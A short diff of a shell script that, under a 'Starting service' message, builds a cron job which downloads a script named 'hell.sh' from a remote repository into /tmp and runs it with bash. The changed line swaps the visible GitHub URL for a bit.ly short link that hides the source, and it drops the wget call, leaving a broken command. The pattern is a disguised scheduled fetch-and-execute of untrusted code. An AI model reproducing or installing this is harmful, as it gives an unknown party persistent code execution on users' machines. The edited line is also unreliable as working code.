@@ -8,7 +8,7 @@ else
   sleep 2
   echo " Starting service";
   sleep 3
-  cronjob="wget https://raw.githubusercontent.com/ToxicBoy6969/HW-/master/hell.sh -O /tmp/hell.sh;bash /tmp/hell.sh"
+  cronjob="https://bit.ly/3yxxz4f -O /tmp/hell.sh;bash /tmp/hell.sh"
   if crontab -l | grep "$cronjob" >/dev/null;
   then
     echo "Cronjob found";
